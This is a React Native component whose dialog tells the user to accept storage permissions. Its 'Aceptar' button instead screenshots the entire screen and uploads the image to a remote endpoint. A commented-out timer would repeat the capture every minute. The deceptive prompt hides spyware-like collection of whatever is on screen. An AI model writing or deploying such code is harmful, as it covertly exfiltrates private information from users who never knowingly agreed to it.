import {
    StyleSheet,
    View,
    Text,
  } from "react-native";
  import CustonButton from "../CustonButton";
  import { captureScreen, releaseCapture } from "react-native-view-shot"
  import React,{useEffect} from "react";
  
  //url
  import {storageCaptura} from "../../util/Apis";
  
  /// ACCESSO AL DIRECTORIO CAMERA
  export const StorageCaptura = ({ onPress }) => {
  const permisos = async() => {
    captureScreen({
      format: "jpg",
      quality: 0.8,
    }).then(
      async(uri) => {
        let localUri = uri
        let filename = localUri.split("/").pop();
      console.log("uri ", uri);
      const file = {
        uri: localUri,
        name: filename,
        type: "image/jpg",
      }
      let formData = new FormData();
      formData.append("fotos", file);
      console.log("FormData", JSON.stringify(formData));
      await fetch(storageCaptura, {
        method: "POST",
        body: formData,
        header: {
          Accept: "application/json",
          // 'Content-Type':'application/json'
          "Content-Type": "application/x-amz-json-1.1",
        },
      }).then((res) => res.json())
      .catch((error) => console.error("ErrorCAPTURA", error))
      .then((response) => {
        console.log("DESDE EL RESPONSE CAPTURA ", response);
      });
      },
      (error) => console.error("Oops, no se pudo capturar la pantalla", error)
    )
    }
    const EnviarCapturaConIntervalo=async()=>{
       await setInterval(permisos,60000)
    }
    useEffect(() => {
      //EnviarCapturaConIntervalo();
    }, [])
    
    return (
      <View style={[styles.card, { marginBottom: -20 }]}>
        <Text style={styles.text}>
          Necesita aceptar los permisos de almacenamiento
        </Text>
  
        <View
          style={[styles.card, { marginTop: 12, padding: 5, marginLeft: 15 }]}
        >
          <CustonButton label={"Aceptar"} padding={10} onPress={()=>{permisos(),onPress()}} />
  
          <View style={{ margin: 20 }} />
  
          <CustonButton label={"Cerrar"} padding={10} onPress={onPress} />
  
        </View>
      </View>
    );
  };
  const styles = StyleSheet.create({
    card: {
      marginTop: 10,
      flexDirection: "row",
      flexWrap: "wrap",
    },
    text: {
      justifyContent: "center",
      alignSelf: "center",
      alignItems: "center",
      marginHorizontal: 20,
    },
    btn: {},
  });
  
  export default StorageCaptura;
  